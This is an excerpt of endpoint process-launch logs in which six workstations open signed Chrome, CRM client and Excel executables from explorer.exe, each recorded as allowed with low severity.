P00563,2026-09-13 19:09:15,WKST-LGL-005,mbandeka,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",667c5c985bb2e6982c4f0d8fe53791b0fc7b91595b97d27e14098aaeb5013424,signed,ALLOWED,Low
P00564,2026-09-13 19:16:29,WKST-PRC-008,sankwasa,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",f7e1f9c25482059771201ef8d0772e98497b9cabbde85b14cfb9781d1713eaf4,signed,ALLOWED,Low
P00565,2026-09-13 19:20:52,WKST-SOC-003,haufiku,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",19738cc9e8c397e3784fbfe0ba83df1affbe8319b558a124da9ffd806774b296,signed,ALLOWED,Low
P00566,2026-09-13 19:40:17,WKST-SWK-008,sihuhua,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",4c937012cc53b81d03d87390cfb758cc242df73b81bcc9ab807f3d17f794b6e9,signed,ALLOWED,Low
P00567,2026-09-13 19:53:17,WKST-MKT-010,ntinda,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",b562e65b2453e7e22f7d5772a209e5e9f45b70a55bf660fcc215e75e43bcdfd9,signed,ALLOWED,Low
P00568,2026-09-13 19:56:04,WKST-HR-002,pnakale,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",33e155dabbc2b2545dca67719a9fcfbdff155fd47f8428d45a3826118e1a8b8b,signed,ALLOWED,Low
